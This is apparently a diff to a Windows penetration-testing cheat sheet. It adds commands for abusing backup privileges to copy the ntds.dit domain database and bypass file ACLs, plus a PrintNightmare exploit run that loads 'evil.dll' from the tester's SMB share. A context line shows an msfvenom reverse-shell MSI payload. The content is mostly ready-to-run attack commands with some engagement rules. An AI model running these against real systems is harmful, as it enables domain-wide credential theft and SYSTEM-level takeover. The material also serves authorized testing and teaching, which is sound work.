@@ -157,6 +157,50 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o /tmp
 msiexec /quiet /qn /i C:\temp\pwned.msi
 ```
 
+## Privilege-based data access (SeBackup/SeRestore/SeTakeOwnership)
+
+`whoami /priv` first — some paths to domain data need no exploit at all:
+
+```powershell
+# SeBackupPrivilege: copy ntds.dit via disk shadow copy
+diskshadow> set context persistent nowriters
+diskshadow> add volume c: alias mydrive
+diskshadow> create
+diskshadow> exec %mydrive%\Windows\System32\cmd.exe /c copy
+           %mydrive%\Windows\NTDS\ntds.dmp C:\temp\ntds.dmp   # robocopy /B variant common
+# Then reg save hklm\system and extract offline with secretsdump
+
+# SeBackupPrivilege: copy any file bypassing ACLs
+robocopy /B C:\Users\administrator\Documents C:\temp\loot
+
+# SeRestorePrivilege: write anywhere (including system files) — treat any
+# write as an engagement artifact; SeTakeOwnership: take ownership of a file
+# first, read it, then restore the original owner
+```
+
+## PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+
+Remote code execution as SYSTEM through the Print Spooler when a driver can
+be loaded — **destructive**: a failed attempt can crash the spooler or leave
+the host's printing broken.
+
+Preconditions: Spooler running, credentials with printer-driver load rights
+(usually admin; ordinary users historically worked pre-patch).
+
+```bash
+# Check spooler exposure first
+nxc smb <target> -u user -p pass --spider SP
+rpcdump.py <target> | grep -A2 MS-RPRN   # MS-RPRN visible → surface present
+
+# Exploit with a driver DLL the target can fetch (SMB share on your side)
+python3 CVE-2021-1675.py 'corp.local/user:pass@<target>' '\\<listener>\share\evil.dll'
+```
+
+Rules: verify the patch state before claiming the CVE; prefer a
+demonstration that stops at SYSTEM proof (`whoami > proof.txt`); record any
+loaded driver as an artifact for removal; if scope does not allow service
+disruption, report the vulnerable surface with evidence instead of firing it.
+
 ## Credential Hunting
 
 ```powershell
